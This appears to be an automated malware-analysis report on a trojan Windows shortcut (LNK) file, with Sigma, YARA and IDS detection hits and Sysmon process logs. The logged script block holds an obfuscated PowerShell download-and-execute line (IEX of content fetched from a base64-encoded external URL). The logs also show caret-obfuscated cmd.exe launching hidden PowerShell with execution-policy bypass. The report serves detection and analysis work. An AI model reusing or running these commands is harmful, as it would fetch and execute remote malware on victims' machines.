threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

exiftool.Flags: IDList, RelativePath, CommandArgs, IconFile, Unicode, ExpString, ExpIcon

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=IEX ([TExT.EnCOdINg]::UTF8.GetSTrINg((Iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly91eXQxbjhkZWQ5ZmIzODAuY29tLzh6ZExIUw==")))).CoNtEnt)); Path=; ScriptBlockId=61122eeb-d454-43db-8954-9bffd2aee3db; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "St^a^rT /M^in "" PO^w^eR^sh^e^ll -w h^id^D^e^N -nOL^oGO -N^Op -eP BYpasS -ENC^Od^e^D^C^OM^MAn^d " [TRUNCATED]; CommandLine=POweRshell  -w hidDeN -nOLoGO -NOp -eP BYpasS -ENCOdeDCOMMAnd " [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\55ghwqhp\55ghwqhp.cmdline}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\george\AppData\Local\Temp\w3qzjphj\w3qzjphj.cmdline}

crowdsourced_ids_results.rule_msg: SERVER-OTHER NetBIOS name request probe attempt
crowdsourced_ids_results.rule_raw: alert udp $EXTERNAL_NET any -> $HOME_NET 137 ( msg:"SERVER-OTHER NetBIOS name request probe attempt"; flow:to_server; content:"|00 00 00 01 00 00 00 00 00 00|",depth 12,offset 2; content:"|00 21 00 01|",distance 0; detection_filter:track by_src,count 5,seconds 2; metadata:policy max-detect-ips drop; service:netbios-ns; classtype:attempted-recon; sid:51127; rev:3; )

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: This rule detects Microsoft Windows LNK shortcut files that reference the cmd.exe command interpreter. While not necessarily indicative of malicious behavior, this is a common pivot leveraged by a variety of malware campaigns.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: MS Windows shortcut, Item id list present, Has Relative path, Has command line arguments, Icon number=347, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide
